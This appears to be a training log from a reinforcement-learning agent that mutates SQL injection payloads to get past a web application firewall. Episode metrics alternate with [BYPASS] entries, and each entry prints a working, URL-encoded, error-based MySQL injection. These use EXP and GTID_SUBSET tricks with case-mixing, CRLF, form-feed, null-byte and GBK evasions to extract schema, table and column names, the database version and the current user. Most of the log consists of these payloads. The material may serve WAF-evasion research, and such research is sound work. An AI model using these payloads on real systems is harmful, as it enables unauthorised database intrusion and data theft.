+  Ep 2690 | SR=0% | Steps=15.0 | R=-38.73
+  Ep 2700 | SR=0% | Steps=15.0 | R=-38.17
+  [BYPASS] Ep 2706 | steps=8 | seq=crlf -> case -> agg_swap -> case -> crlf -> case -> case -> null_byte
+           payload: 1'%0d%0aanD%0d%0aEXP(~(sELECt%0d%0a*%0d%0afrom%0d%0a(sELEct%0d%0a((SeLEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aInforMATion_sCHEmA.schemata))
+  Ep 2710 | SR=10% | Steps=14.3 | R=-35.75
+  [BYPASS] Ep 2720 | steps=15 | seq=case -> case -> case -> case -> case -> case -> formfeed -> case -> case -> null_byte -> case -> null_byte -> case -> null_byte -> agg_swap
+           payload: 1'%0caNd%0cEXP(~(seLECt%0c*%0cFROm%0c(SelecT%0c((sELECT%0cJSON_ARRAYAGG(schema_name)%0cfROM%0ciNFormaTion_SChEmA.schemata)))a));%00
+  Ep 2720 | SR=10% | Steps=15.0 | R=-37.59
+  [BYPASS] Ep 2724 | steps=12 | seq=case -> crlf -> case -> hex_to_char -> null_byte -> case -> hash_nl -> case -> case -> case -> null_byte -> agg_swap
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SeLECT%0d%0a*%0d%0aFrOm%0d%0a(seleCt%0d%0a((SeLeCt%0d%0aJSON_ARRAYAGG(CONCAT(tAbLE_schema,CHAR(46),TaBLE_name))%0d%0afroM%0d%0a
+  Ep 2730 | SR=10% | Steps=14.7 | R=-36.15
+  Ep 2740 | SR=0% | Steps=15.0 | R=-37.51
+  Ep 2750 | SR=0% | Steps=15.0 | R=-38.71
+  [BYPASS] Ep 2759 | steps=15 | seq=case -> case -> agg_swap -> case -> null_byte -> case -> case -> null_byte -> case -> agg_swap -> case -> case -> case -> crlf -> func_sp_nbsp
+           payload: 1'%0d%0aand%0d%0aEXP(~(seleCT%0d%0a*%0d%0aFRom%0d%0a(SelEcT%0d%0a(version%a0()))a));%00
+  Ep 2760 | SR=10% | Steps=15.0 | R=-37.08
+  Ep 2770 | SR=0% | Steps=15.0 | R=-39.29
+  [BYPASS] Ep 2772 | steps=12 | seq=case -> gbk_bypass -> agg_swap -> crlf -> case -> func_sp_nbsp -> agg_swap -> hash_nl_all -> agg_swap -> case -> agg_swap -> null_byte
+           payload: 1%bf%27%0d%0aaND%0d%0aEXP(~(SeLeCT%0d%0a*%0d%0afrom%0d%0a(SELEct%0d%0a(daTabase%a0()))a));%00
+  Ep 2780 | SR=10% | Steps=14.7 | R=-38.52
+  Ep 2790 | SR=0% | Steps=15.0 | R=-37.58
+  [BYPASS] Ep 2798 | steps=7 | seq=case -> case -> null_byte -> case -> formfeed -> null_byte -> agg_swap
+           payload: 1'%0caND%0cEXP(~(SELECt%0c*%0cFRoM%0c(SeLeCT%0c((sELECT%0cJSON_ARRAYAGG(schema_name)%0cfROM%0ciNfOrMaTion_schema.schemata)))a));%00
+  Ep 2800 | SR=10% | Steps=14.2 | R=-34.86
+  [BYPASS] Ep 2810 | steps=9 | seq=agg_swap -> formfeed -> case -> case -> null_byte -> crlf -> case -> case -> hex_to_char
+           payload: 1'%0cand%0cEXP(~(SELeCT%0c*%0cfROM%0c(seleCt%0c((SElEct%0cJSON_ARRAYAGG(ConcAt(TabLE_schema,CHAR(46),tAbLE_name))%0cfROm%0cinFoRMAtIoN_SChEmA.TAbles%0
+  Ep 2810 | SR=10% | Steps=14.4 | R=-34.60
+  [BYPASS] Ep 2812 | steps=8 | seq=case -> agg_swap -> case -> agg_swap -> case -> crlf -> case -> null_byte
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(seleCt%0d%0a*%0d%0aFRoM%0d%0a(SeLECT%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aINfOrmatIoN_sCheMa.schemata))
+  Ep 2820 | SR=10% | Steps=14.3 | R=-33.97
+  Ep 2830 | SR=0% | Steps=15.0 | R=-39.63
+  Ep 2840 | SR=0% | Steps=15.0 | R=-37.78
+  Ep 2850 | SR=0% | Steps=15.0 | R=-37.72
+  [BYPASS] Ep 2852 | steps=11 | seq=case -> case -> null_byte -> crlf -> case -> case -> case -> case -> case -> null_byte -> agg_swap
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SelEcT%0d%0a*%0d%0afrOm%0d%0a(seLeCt%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0aINfoRMatiON_ScHEMa.schemata))
+  [BYPASS] Ep 2856 | steps=9 | seq=case -> hex_to_char -> case -> crlf -> agg_swap -> agg_swap -> case -> case -> null_byte
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SelECt%0d%0a*%0d%0afrOM%0d%0a(SELECt%0d%0a((SElECt%0d%0aJSON_ARRAYAGG(cONCAt(tAbLE_schema,CHAR(46),TABle_name))%0d%0afROM%0d%0a
+  Ep 2860 | SR=20% | Steps=14.0 | R=-31.67
+  [BYPASS] Ep 2868 | steps=5 | seq=case -> char_split -> agg_swap -> crlf -> null_byte
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SElECT%0d%0a*%0d%0aFROm%0d%0a(SElect%0d%0a((sELECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOM%0d%0aInfOrMatION_schEmA.schemata))
+  [BYPASS] Ep 2870 | steps=10 | seq=case -> crlf -> case -> agg_swap -> case -> case -> case -> case -> crlf -> null_byte
+           payload: 1'%0d%0aanD%0d%0aEXP(~(selEct%0d%0a*%0d%0aFroM%0d%0a(SELEct%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aInFoRMatIon_sChEma.schemata))
+  Ep 2870 | SR=20% | Steps=13.5 | R=-31.99
+  [BYPASS] Ep 2874 | steps=15 | seq=case -> crlf -> null_byte -> case -> case -> comment -> case -> case -> case -> case -> null_byte -> agg_swap -> backtick -> case -> func_sp_nbsp
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SELECt%0d%0a*%0d%0afROM%0d%0a(SELect%0d%0a((selECT%0d%0aJSON_ARRAYAGG(column_name)%0d%0afroM%0d%0aiNFormatION_scHEma.columns%0d
+  Ep 2880 | SR=10% | Steps=15.0 | R=-37.02
+  Ep 2890 | SR=0% | Steps=15.0 | R=-39.78
+  Ep 2900 | SR=0% | Steps=15.0 | R=-37.82
+  Ep 2910 | SR=0% | Steps=15.0 | R=-38.74
+  [BYPASS] Ep 2915 | steps=9 | seq=crlf -> agg_swap -> case -> null_byte -> case -> null_byte -> agg_swap -> case -> hex_to_char
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sEleCT%0d%0a*%0d%0afrOm%0d%0a(sElECt%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(CONcAT(TaBLE_schema,CHAR(46),TABlE_name))%0d%0afrOM%0d%0a
+  [BYPASS] Ep 2916 | steps=9 | seq=func_sp_ff -> hex_to_char -> case -> formfeed -> case -> case -> agg_swap -> case -> null_byte
+           payload: 1'%0cANd%0cEXP(~(seLECT%0c*%0cFrOM%0c(SeLECT%0c((SElecT%0cJSON_ARRAYAGG(cOnCat(table_schema,CHAR(46),taBLe_name))%0cfROm%0cINfORmaTIoN_sChEMa.tAbLes%0
+  [BYPASS] Ep 2919 | steps=6 | seq=case -> hex_to_char -> crlf -> case -> null_byte -> agg_swap
+           payload: 1'%0d%0aAND%0d%0aEXP(~(sElEct%0d%0a*%0d%0aFrOM%0d%0a(seLECT%0d%0a((sELECt%0d%0aJSON_ARRAYAGG(CONCAT(tABLe_schema,CHAR(46),tablE_name))%0d%0afROM%0d%0a
+  Ep 2920 | SR=30% | Steps=12.9 | R=-27.71
+  [BYPASS] Ep 2921 | steps=7 | seq=agg_swap -> case -> func_sp_nbsp -> ident_backtick -> case -> formfeed -> null_byte
+           payload: 1'%0cAnd%0cGTID_SUBSET((DAtaBaSE%a0()),1);%00
+  Ep 2930 | SR=10% | Steps=14.2 | R=-33.92
+  Ep 2940 | SR=0% | Steps=15.0 | R=-38.67
+  Ep 2950 | SR=0% | Steps=15.0 | R=-36.91
+  Ep 2960 | SR=0% | Steps=15.0 | R=-38.41
+  Ep 2970 | SR=0% | Steps=15.0 | R=-37.59
+  Ep 2980 | SR=0% | Steps=15.0 | R=-36.91
+  Ep 2990 | SR=0% | Steps=15.0 | R=-38.30
+  Ep 3000 | SR=0% | Steps=15.0 | R=-38.71
+  [BYPASS] Ep 3001 | steps=5 | seq=agg_swap -> crlf -> case -> case -> null_byte
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SEleCt%0d%0a*%0d%0aFroM%0d%0a(selEct%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aiNfOrMAtIOn_scHeMA.schemata))
+  [BYPASS] Ep 3004 | steps=14 | seq=agg_swap -> case -> crlf -> case -> case -> case -> null_byte -> case -> case -> case -> case -> case -> hex_to_char -> func_sp_nbsp
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELeCt%0d%0a*%0d%0aFRom%0d%0a(sELecT%0d%0a((sELECT%0d%0aJSON_ARRAYAGG(column_name)%0d%0aFroM%0d%0aiNFOrmATION_ScHEMa.columns%0d
+  Ep 3010 | SR=20% | Steps=13.9 | R=-31.38
+  Ep 3020 | SR=0% | Steps=15.0 | R=-36.51
+  Ep 3030 | SR=0% | Steps=15.0 | R=-37.39
+  Ep 3040 | SR=0% | Steps=15.0 | R=-38.20
+  Ep 3050 | SR=0% | Steps=15.0 | R=-37.53
+  Ep 3060 | SR=0% | Steps=15.0 | R=-37.65
+  [BYPASS] Ep 3065 | steps=9 | seq=case -> hex_to_char -> case -> case -> crlf -> case -> null_byte -> case -> agg_swap
+           payload: 1'%0d%0aAND%0d%0aEXP(~(selecT%0d%0a*%0d%0afROM%0d%0a(SeLEcT%0d%0a((SelecT%0d%0aJSON_ARRAYAGG(CONCAT(TABLE_schema,CHAR(46),tablE_name))%0d%0aFRom%0d%0a
+  Ep 3070 | SR=10% | Steps=14.4 | R=-33.58
+  [BYPASS] Ep 3071 | steps=15 | seq=case -> case -> case -> null_byte -> case -> case -> hex_to_char -> agg_swap -> case -> case -> case -> case -> crlf -> case -> func_sp_nbsp
+           payload: 1'%0d%0aand%0d%0aEXP(~(seleCt%0d%0a*%0d%0aFRoM%0d%0a(sELeCt%0d%0a((SElEct%0d%0aConCAT(CHAR(124),JSON_ARRAYAGG(TABLe_name),CHAR(124))%0d%0aFRoM%0d%0aIN
+  Ep 3080 | SR=10% | Steps=15.0 | R=-36.94
+  Ep 3090 | SR=0% | Steps=15.0 | R=-35.91
+  Ep 3100 | SR=0% | Steps=15.0 | R=-36.84
+  Ep 3110 | SR=0% | Steps=15.0 | R=-36.54
+  Ep 3120 | SR=0% | Steps=15.0 | R=-36.81
+  Ep 3130 | SR=0% | Steps=15.0 | R=-37.55
+  [BYPASS] Ep 3133 | steps=11 | seq=unhex_wrap -> case -> crlf -> case -> case -> case -> func_sp_nbsp -> case -> case -> func_sp_nbsp -> null_byte
+           payload: 1'%0d%0aANd%0d%0aEXP(~(sElEct%0d%0a*%0d%0aFRoM%0d%0a(sElecT%0d%0a(user%a0()))a));%00
+  Ep 3140 | SR=10% | Steps=14.6 | R=-35.00
+  [BYPASS] Ep 3148 | steps=8 | seq=dot_prefix -> case -> crlf -> case -> null_byte -> case -> case -> func_sp_nbsp
+           payload: .11'%0d%0aanD%0d%0aEXP(~(seleCT%0d%0a*%0d%0afrOm%0d%0a(SeLEcT%0d%0a(DaTAbASE%a0()))a));%00
+  Ep 3150 | SR=10% | Steps=14.3 | R=-34.51
+  [BYPASS] Ep 3153 | steps=14 | seq=case -> case -> case -> case -> crlf -> case -> case -> case -> case -> null_byte -> case -> case -> case -> agg_swap
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(selecT%0d%0a*%0d%0afROM%0d%0a(sELEct%0d%0a((SeLECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROM%0d%0ainformatIon_sCHeMa.schemata))
+  Ep 3160 | SR=10% | Steps=14.9 | R=-35.13
+  Ep 3170 | SR=0% | Steps=15.0 | R=-35.23
+  Ep 3180 | SR=0% | Steps=15.0 | R=-37.29
+  [BYPASS] Ep 3183 | steps=7 | seq=null_byte -> case -> case -> agg_swap -> func_sp_nl -> case -> crlf
+           payload: 1'%0d%0aANd%0d%0aEXP(~(selEcT%0d%0a*%0d%0afrOm%0d%0a(sEleCT%0d%0a((seLECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0aiNfORMAtion_ScHEmA.schemata))
+  [BYPASS] Ep 3190 | steps=8 | seq=case -> null_byte -> case -> hex_to_char -> func_sp_nl -> agg_swap -> case -> crlf
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(sELECT%0d%0a*%0d%0aFrOM%0d%0a(sEleCt%0d%0a((SelEcT%0d%0aJSON_ARRAYAGG(COncAT(TaBlE_schema,CHAR(46),taBLE_name))%0d%0afRoM%0d%0a
+  Ep 3190 | SR=20% | Steps=13.5 | R=-30.56
+  [BYPASS] Ep 3196 | steps=7 | seq=crlf -> case -> null_byte -> null_byte -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aAnD%0d%0aGTID_SUBSET((version%a0()),1);%00
+  [BYPASS] Ep 3197 | steps=6 | seq=case -> crlf -> convert_charset -> case -> null_byte -> func_sp_nbsp
+           payload: 1'%0d%0aANd%0d%0aGTID_SUBSET((daTAbASE%a0()),1);%00
+  Ep 3200 | SR=20% | Steps=13.3 | R=-29.17
+  Ep 3210 | SR=0% | Steps=15.0 | R=-36.88
+  Ep 3220 | SR=0% | Steps=15.0 | R=-37.41
+  Ep 3230 | SR=0% | Steps=15.0 | R=-36.60
+  Ep 3240 | SR=0% | Steps=15.0 | R=-36.41
+  Ep 3250 | SR=0% | Steps=15.0 | R=-36.55
+  Ep 3260 | SR=0% | Steps=15.0 | R=-36.82
+  [BYPASS] Ep 3265 | steps=11 | seq=agg_swap -> case -> case -> case -> func_sp_nl -> case -> crlf -> case -> case -> case -> null_byte
+           payload: 1'%0d%0aAND%0d%0aEXP(~(seLECT%0d%0a*%0d%0afROM%0d%0a(seLect%0d%0a((sELECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aInFORmaTION_SCHEMa.schemata))
+  Ep 3270 | SR=10% | Steps=14.6 | R=-35.65
+  [BYPASS] Ep 3277 | steps=7 | seq=case -> null_byte -> case -> crlf -> hex_to_char -> null_byte -> agg_swap
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(SElECT%0d%0a*%0d%0aFRoM%0d%0a(SElecT%0d%0a((selECT%0d%0aJSON_ARRAYAGG(CONCAT(tAble_schema,CHAR(46),TaBlE_name))%0d%0aFRom%0d%0a
+  Ep 3280 | SR=10% | Steps=14.2 | R=-34.36
+  [BYPASS] Ep 3289 | steps=4 | seq=agg_swap -> null_byte -> case -> crlf
+           payload: 1'%0d%0aanD%0d%0aEXP(~(selEcT%0d%0a*%0d%0aFRoM%0d%0a(SElEct%0d%0a((SeLECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aInForMATiON_sCheMA.schemata))
+  Ep 3290 | SR=10% | Steps=13.9 | R=-31.48
+  Ep 3300 | SR=0% | Steps=15.0 | R=-37.68
+  [BYPASS] Ep 3306 | steps=7 | seq=agg_swap -> case -> crlf -> case -> case -> case -> null_byte
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SeLect%0d%0a*%0d%0aFrOM%0d%0a(SeLEct%0d%0a((seLECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0ainfOrMatiOn_schEma.schemata))
+  Ep 3310 | SR=10% | Steps=14.2 | R=-33.60
+  Ep 3320 | SR=0% | Steps=15.0 | R=-36.26
+  Ep 3330 | SR=0% | Steps=15.0 | R=-37.25
+  Ep 3340 | SR=0% | Steps=15.0 | R=-33.93
+  [BYPASS] Ep 3346 | steps=7 | seq=case -> hex_to_char -> null_byte -> agg_swap -> case -> case -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(sElect%0d%0a*%0d%0aFroM%0d%0a(SeleCt%0d%0a((SeLEct%0d%0aJSON_ARRAYAGG(ConCat(TaBLE_schema,CHAR(46),TaBle_name))%0d%0aFroM%0d%0a
+  Ep 3350 | SR=10% | Steps=14.2 | R=-32.50
+  Ep 3360 | SR=0% | Steps=15.0 | R=-35.77
+  Ep 3370 | SR=0% | Steps=15.0 | R=-37.69
+  Ep 3380 | SR=0% | Steps=15.0 | R=-36.30
+  Ep 3390 | SR=0% | Steps=15.0 | R=-36.67
+  [BYPASS] Ep 3394 | steps=15 | seq=case -> case -> case -> case -> case -> case -> null_byte -> case -> case -> func_sp_nl -> case -> case -> agg_swap -> case -> crlf
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(sElEcT%0d%0a*%0d%0afROM%0d%0a(sELeCT%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRom%0d%0aInfOrMATion_scHemA.schemata))
+  Ep 3400 | SR=10% | Steps=15.0 | R=-35.52
+  Ep 3410 | SR=0% | Steps=15.0 | R=-35.76
+  [BYPASS] Ep 3413 | steps=14 | seq=case -> hex_to_char -> case -> case -> case -> agg_swap -> case -> agg_swap -> case -> case -> formfeed -> case -> case -> null_byte
+           payload: 1'%0cand%0cEXP(~(sElect%0c*%0cFROm%0c(sELeCT%0c((sElECT%0cJSON_ARRAYAGG(ConCaT(TaBle_schema,CHAR(46),TABlE_name))%0cfRom%0ciNfOrMaTIOn_sCheMA.tAbles%0
+  Ep 3420 | SR=10% | Steps=14.9 | R=-33.75
+  Ep 3430 | SR=0% | Steps=15.0 | R=-36.54
+  Ep 3440 | SR=0% | Steps=15.0 | R=-36.50
+  [BYPASS] Ep 3442 | steps=9 | seq=case -> null_byte -> null_byte -> case -> null_byte -> case -> crlf -> case -> agg_swap
+           payload: 1'%0d%0aaND%0d%0aEXP(~(seleCt%0d%0a*%0d%0afrOm%0d%0a(seLect%0d%0a((seLECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aiNFOrmAtIOn_Schema.schemata))
+  Ep 3450 | SR=10% | Steps=14.4 | R=-33.28
+  Ep 3460 | SR=0% | Steps=15.0 | R=-38.29
+  Ep 3470 | SR=0% | Steps=15.0 | R=-36.43
+  Ep 3480 | SR=0% | Steps=15.0 | R=-37.28
+  Ep 3490 | SR=0% | Steps=15.0 | R=-35.86
+  Ep 3500 | SR=0% | Steps=15.0 | R=-36.79
+  Ep 3510 | SR=0% | Steps=15.0 | R=-36.44
+  Ep 3520 | SR=0% | Steps=15.0 | R=-35.42
+  Ep 3530 | SR=0% | Steps=15.0 | R=-37.41
+  Ep 3540 | SR=0% | Steps=15.0 | R=-37.08
+  Ep 3550 | SR=0% | Steps=15.0 | R=-37.28
+  Ep 3560 | SR=0% | Steps=15.0 | R=-37.23
+  Ep 3570 | SR=0% | Steps=15.0 | R=-36.81
+  Ep 3580 | SR=0% | Steps=15.0 | R=-37.40
+  Ep 3590 | SR=0% | Steps=15.0 | R=-36.03
+  [BYPASS] Ep 3593 | steps=15 | seq=case -> crlf -> case -> case -> case -> case -> case -> gbk_bypass -> case -> case -> case -> case -> null_byte -> case -> agg_swap
+           payload: 1%bf%27%0d%0aAnD%0d%0aEXP(~(SeLECt%0d%0a*%0d%0afROM%0d%0a(SELEct%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOM%0d%0aINfoRMAtion_SChEmA.schem
+  [BYPASS] Ep 3598 | steps=8 | seq=case -> hex_to_char -> case -> case -> null_byte -> agg_swap -> case -> crlf
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SElEcT%0d%0a*%0d%0aFRom%0d%0a(seLect%0d%0a((SeLECt%0d%0aJSON_ARRAYAGG(ConcAt(tABLe_schema,CHAR(46),TabLe_name))%0d%0afROM%0d%0a
+  Ep 3600 | SR=20% | Steps=14.3 | R=-31.87
+  [BYPASS] Ep 3609 | steps=12 | seq=case -> crlf -> case -> null_byte -> case -> null_byte -> case -> hex_to_char -> func_swap_err -> case -> case -> agg_swap
+           payload: 1'%0d%0aANd%0d%0aEXP(~(SelECT%0d%0a*%0d%0afroM%0d%0a(sEleCt%0d%0a((seLeCT%0d%0aJSON_ARRAYAGG(CONCAT(table_schema,CHAR(46),TabLe_name))%0d%0afRoM%0d%0a
+  Ep 3610 | SR=10% | Steps=14.7 | R=-33.58
+  Ep 3620 | SR=0% | Steps=15.0 | R=-37.58
+  [BYPASS] Ep 3621 | steps=14 | seq=case -> crlf -> case -> hex_to_char -> case -> crlf -> case -> case -> case -> case -> agg_swap -> case -> case -> null_byte
+           payload: 1'%0d%0aaND%0d%0aEXP(~(SElect%0d%0a*%0d%0afROm%0d%0a(SElEct%0d%0a((sELect%0d%0aJSON_ARRAYAGG(cOnCAt(TAblE_schema,CHAR(46),tabLE_name))%0d%0aFroM%0d%0a
+  [BYPASS] Ep 3624 | steps=5 | seq=case -> crlf -> agg_swap -> case -> null_byte
+           payload: 1'%0d%0aAnD%0d%0aEXP(~(SElect%0d%0a*%0d%0aFROM%0d%0a(sELECt%0d%0a((sELect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0ainFORmAtION_SChEmA.schemata))
+  Ep 3630 | SR=20% | Steps=13.9 | R=-31.55
+  [BYPASS] Ep 3638 | steps=6 | seq=agg_swap -> case -> null_byte -> agg_swap -> case -> crlf
+           payload: 1'%0d%0aAND%0d%0aEXP(~(selECt%0d%0a*%0d%0afROm%0d%0a(sElEct%0d%0a((SELecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRom%0d%0aiNForMaTIOn_schEmA.schemata))
+  Ep 3640 | SR=10% | Steps=14.1 | R=-34.92
+  Ep 3650 | SR=0% | Steps=15.0 | R=-38.30
+  Ep 3660 | SR=0% | Steps=15.0 | R=-36.59
+  Ep 3670 | SR=0% | Steps=15.0 | R=-37.30
+  Ep 3680 | SR=0% | Steps=15.0 | R=-37.06
+  Ep 3690 | SR=0% | Steps=15.0 | R=-35.73
+  [BYPASS] Ep 3693 | steps=7 | seq=case -> crlf -> hex_to_char -> case -> case -> null_byte -> agg_swap
+           payload: 1'%0d%0aand%0d%0aEXP(~(SeLeCT%0d%0a*%0d%0afrOM%0d%0a(SELect%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(CONCAT(TAbLE_schema,CHAR(46),taBLE_name))%0d%0aFroM%0d%0a
+  Ep 3700 | SR=10% | Steps=14.2 | R=-31.62
+  Ep 3710 | SR=0% | Steps=15.0 | R=-36.27
+  Ep 3720 | SR=0% | Steps=15.0 | R=-36.96
+  Ep 3730 | SR=0% | Steps=15.0 | R=-38.28
+  Ep 3740 | SR=0% | Steps=15.0 | R=-37.83
+  [BYPASS] Ep 3745 | steps=6 | seq=agg_swap -> case -> func_sp_ff -> null_byte -> case -> crlf
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(selecT%0d%0a*%0d%0aFROm%0d%0a(SeleCT%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aINforMAtiON_scHema.schemata))
+  [BYPASS] Ep 3750 | steps=14 | seq=case -> case -> crlf -> case -> case -> case -> case -> case -> case -> case -> agg_swap -> case -> case -> null_byte
+           payload: 1'%0d%0aaNd%0d%0aEXP(~(seLECT%0d%0a*%0d%0aFRom%0d%0a(selEct%0d%0a((SeLEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aiNfoRmaTion_SchEMA.schemata))
+  Ep 3750 | SR=20% | Steps=14.0 | R=-31.15
+  Ep 3760 | SR=0% | Steps=15.0 | R=-37.86
+  Ep 3770 | SR=0% | Steps=15.0 | R=-37.38
+  Ep 3780 | SR=0% | Steps=15.0 | R=-37.42
+  Ep 3790 | SR=0% | Steps=15.0 | R=-36.39
+  Ep 3800 | SR=0% | Steps=15.0 | R=-37.48
+  Ep 3810 | SR=0% | Steps=15.0 | R=-37.07
+  Ep 3820 | SR=0% | Steps=15.0 | R=-36.89
+  Ep 3830 | SR=0% | Steps=15.0 | R=-36.56
+  Ep 3840 | SR=0% | Steps=15.0 | R=-35.88
+  Ep 3850 | SR=0% | Steps=15.0 | R=-36.52
+  [BYPASS] Ep 3855 | steps=6 | seq=agg_swap -> case -> crlf -> case -> case -> null_byte
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SelecT%0d%0a*%0d%0afROM%0d%0a(seLEcT%0d%0a((sElEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOm%0d%0aInFoRmATIoN_sChEmA.schemata))
+  Ep 3860 | SR=10% | Steps=14.1 | R=-32.28
+  Ep 3870 | SR=0% | Steps=15.0 | R=-37.28
+  Ep 3880 | SR=0% | Steps=15.0 | R=-36.66
+  Ep 3890 | SR=0% | Steps=15.0 | R=-36.68
+  Ep 3900 | SR=0% | Steps=15.0 | R=-36.79
+  Ep 3910 | SR=0% | Steps=15.0 | R=-36.89
+  Ep 3920 | SR=0% | Steps=15.0 | R=-37.14
+  Ep 3930 | SR=0% | Steps=15.0 | R=-34.52
+  [BYPASS] Ep 3932 | steps=7 | seq=case -> null_byte -> agg_swap -> hex_to_char -> dot_prefix -> case -> crlf
+           payload: .11'%0d%0aAnd%0d%0aEXP(~(SElect%0d%0a*%0d%0aFRoM%0d%0a(selEcT%0d%0a((sElect%0d%0aJSON_ARRAYAGG(CoNCat(TaBle_schema,CHAR(46),taBlE_name))%0d%0aFrOM%0d%
+  Ep 3940 | SR=10% | Steps=14.2 | R=-32.33
+  Ep 3950 | SR=0% | Steps=15.0 | R=-37.21
+  Ep 3960 | SR=0% | Steps=15.0 | R=-36.17
+  Ep 3970 | SR=0% | Steps=15.0 | R=-37.28
+  Ep 3980 | SR=0% | Steps=15.0 | R=-36.48
+  Ep 3990 | SR=0% | Steps=15.0 | R=-36.90
+  Ep 4000 | SR=0% | Steps=15.0 | R=-37.12
+  Ep 4010 | SR=0% | Steps=15.0 | R=-36.23
+  Ep 4020 | SR=0% | Steps=15.0 | R=-36.14
+  Ep 4030 | SR=0% | Steps=15.0 | R=-35.97
+  Ep 4040 | SR=0% | Steps=15.0 | R=-37.36
+  Ep 4050 | SR=0% | Steps=15.0 | R=-37.11
+  Ep 4060 | SR=0% | Steps=15.0 | R=-36.10
+  Ep 4070 | SR=0% | Steps=15.0 | R=-37.02
+  Ep 4080 | SR=0% | Steps=15.0 | R=-36.68
+  Ep 4090 | SR=0% | Steps=15.0 | R=-36.48
+  Ep 4100 | SR=0% | Steps=15.0 | R=-36.26
+  Ep 4110 | SR=0% | Steps=15.0 | R=-36.37
+  [BYPASS] Ep 4115 | steps=8 | seq=null_byte -> case -> crlf -> case -> hex_to_char -> case -> case -> agg_swap
+           payload: 1'%0d%0aAND%0d%0aEXP(~(SELEct%0d%0a*%0d%0afROM%0d%0a(SELect%0d%0a((seleCT%0d%0aJSON_ARRAYAGG(CONCAT(Table_schema,CHAR(46),table_name))%0d%0afrom%0d%0a
+  Ep 4120 | SR=10% | Steps=14.3 | R=-33.71
+  Ep 4130 | SR=0% | Steps=15.0 | R=-37.11
+  Ep 4140 | SR=0% | Steps=15.0 | R=-36.37
+  Ep 4150 | SR=0% | Steps=15.0 | R=-36.83
+  Ep 4160 | SR=0% | Steps=15.0 | R=-37.31
+  Ep 4170 | SR=0% | Steps=15.0 | R=-35.99
+  Ep 4180 | SR=0% | Steps=15.0 | R=-35.82
+  Ep 4190 | SR=0% | Steps=15.0 | R=-36.99
+  Ep 4200 | SR=0% | Steps=15.0 | R=-36.71
+  [BYPASS] Ep 4209 | steps=9 | seq=case -> agg_swap -> case -> crlf -> case -> case -> case -> case -> null_byte
+           payload: 1'%0d%0aAND%0d%0aEXP(~(sEleCt%0d%0a*%0d%0aFrOM%0d%0a(SeLeCt%0d%0a((sElECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aINformAtiON_scHemA.schemata))
+  Ep 4210 | SR=10% | Steps=14.4 | R=-32.53
+  Ep 4220 | SR=0% | Steps=15.0 | R=-36.87
+  Ep 4230 | SR=0% | Steps=15.0 | R=-36.93
+  [BYPASS] Ep 4237 | steps=6 | seq=agg_swap -> agg_swap -> null_byte -> crlf -> func_sp_nbsp -> case
+           payload: 1'%0d%0aanD%0d%0aEXP(~(SElECT%0d%0a*%0d%0afROM%0d%0a(sELECT%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0ainFOrmAtion_sCHEMA.schemata))
+  Ep 4240 | SR=10% | Steps=14.1 | R=-30.67
+  [BYPASS] Ep 4244 | steps=4 | seq=agg_swap -> null_byte -> crlf -> case
+           payload: 1'%0d%0aAnd%0d%0aEXP(~(SelecT%0d%0a*%0d%0afRoM%0d%0a(SeLEct%0d%0a((sEleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afroM%0d%0aInfORMaTiON_sChEMa.schemata))
+  [BYPASS] Ep 4249 | steps=9 | seq=case -> null_byte -> case -> concat_char -> case -> crlf -> case -> case -> func_sp_nbsp
+           payload: 1'%0d%0aAND%0d%0aGTID_SUBSET((user%a0()),1);%00
+  Ep 4250 | SR=20% | Steps=13.3 | R=-29.80
+  Ep 4260 | SR=0% | Steps=15.0 | R=-36.06
+  Ep 4270 | SR=0% | Steps=15.0 | R=-36.43
+  Ep 4280 | SR=0% | Steps=15.0 | R=-35.37
+  Ep 4290 | SR=0% | Steps=15.0 | R=-36.75
+  Ep 4300 | SR=0% | Steps=15.0 | R=-36.59
+  Ep 4310 | SR=0% | Steps=15.0 | R=-37.12
